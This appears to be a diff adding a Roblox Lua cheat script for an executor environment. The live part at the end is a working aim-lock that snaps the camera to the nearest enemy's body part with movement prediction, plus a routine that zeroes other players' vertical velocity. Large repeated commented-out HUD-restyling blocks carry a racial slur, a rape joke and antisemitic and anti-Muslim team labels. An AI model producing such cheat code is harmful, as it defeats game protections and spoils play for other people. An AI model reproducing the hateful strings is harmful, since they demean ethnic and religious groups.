+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().DNS.Tracer.Key:lower()
+    if (Key == Keybind) then
+        if getgenv().DNS.Tracer.Enabled == true then
+            IsTargetting = not IsTargetting
+            if IsTargetting then
+                Plr = GetClosest()
+            else
+                if Plr ~= nil then
+                    Plr = nil
+                end
+            end
+        end
+    end
+end)
+
+function GetClosest()
+    local closestPlayer
+    local shortestDistance = math.huge
+    for i, v in pairs(game.Players:GetPlayers()) do
+        pcall(function()
+
+            if v ~= game.Players.LocalPlayer and v.Character and
+                v.Character:FindFirstChild("Humanoid") then
+                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+                local magnitude =
+                (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
+                if (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude < shortestDistance then
+                    closestPlayer = v
+                    shortestDistance = magnitude
+                end
+            end
+        end)
+    end
+    return closestPlayer
+end
+
+local function IsOnScreen(Object)
+    local IsOnScreen = game.Workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
+    return IsOnScreen
+end
+
+local function Filter(Object)
+    if string.find(Object.Name, "Gun") then
+        return
+    end
+    if Object:IsA("Part") or Object:IsA("MeshPart") then
+        return true
+    end
+end
+
+local function WTSPos(Position)
+    local ObjectVector = game.Workspace.CurrentCamera:WorldToScreenPoint(Position)
+    return Vector2.new(ObjectVector.X, ObjectVector.Y)
+end
+
+local function WTS(Object)
+    local ObjectVector = game.Workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
+    return Vector2.new(ObjectVector.X, ObjectVector.Y)
+end
+
+function GetNearestPartToCursorOnCharacter(character)
+    local ClosestDistance = math.huge
+    local BodyPart = nil
+
+    if (character and character:GetChildren()) then
+        for k,  x in next, character:GetChildren() do
+            if Filter(x) and IsOnScreen(x) then
+                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+    
+                if Distance < ClosestDistance then
+                    ClosestDistance = Distance
+                    BodyPart = x
+                end
+            end
+        end
+    end
+
+    return BodyPart
+end
+
+game.RunService.Heartbeat:Connect(function()
+    if getgenv().DNS.Tracer.Enabled == true and Plr and Plr.Character ~= nil then
+        if getgenv().DNS.Misc.UnlockedOnDeath then
+            if Plr.Character.BodyEffects["K.O"].Value then Plr = nil end
+        end
+        if getgenv().DNS.Misc.Shake then
+            local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().DNS.Tracer.Part].Position + Plr.Character[getgenv().DNS.Tracer.Part].Velocity * getgenv().DNS.Tracer.Pred +
+            Vector3.new(
+                math.random(-getgenv().DNS.Misc.ShakeValue, getgenv().DNS.Misc.ShakeValue),
+                math.random(-getgenv().DNS.Misc.ShakeValue, getgenv().DNS.Misc.ShakeValue),
+                math.random(-getgenv().DNS.Misc.ShakeValue, getgenv().DNS.Misc.ShakeValue)
+            ) * 0.1)
+            Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().DNS.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+        else
+            local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().DNS.Tracer.Part].Position + Plr.Character[getgenv().DNS.Tracer.Part].Velocity * getgenv().DNS.Tracer.Pred)
+            Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().DNS.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait() do
+        if getgenv().DNS.Tracer.Enabled and Plr ~= nil and (Plr.Character) then
+            getgenv().DNS.Tracer.Part = tostring(GetNearestPartToCursorOnCharacter(Plr.Character))
+        end
+    end
+end)
+wait(1)
+local RunService = game:GetService("RunService")
+
+local function zeroOutYVelocity(hrp)
+    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
+    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
+end
+
+local function onPlayerAdded(player)
+    player.CharacterAdded:Connect(function(character)
+        local hrp = character:WaitForChild("HumanoidRootPart")
+        zeroOutYVelocity(hrp)
+    end)
+end
+
+local function onPlayerRemoving(player)
+    player.CharacterAdded:Disconnect()
+end
+
+game.Players.PlayerAdded:Connect(onPlayerAdded)
+game.Players.PlayerRemoving:Connect(onPlayerRemoving)
+
+RunService.Heartbeat:Connect(function()
+    pcall(function()
+        for i, player in pairs(game.Players:GetChildren()) do
+            if player.Name ~= game.Players.LocalPlayer.Name then
+                local hrp = player.Character.HumanoidRootPart
+                zeroOutYVelocity(hrp)
+            end
+        end
+    end)
+end)
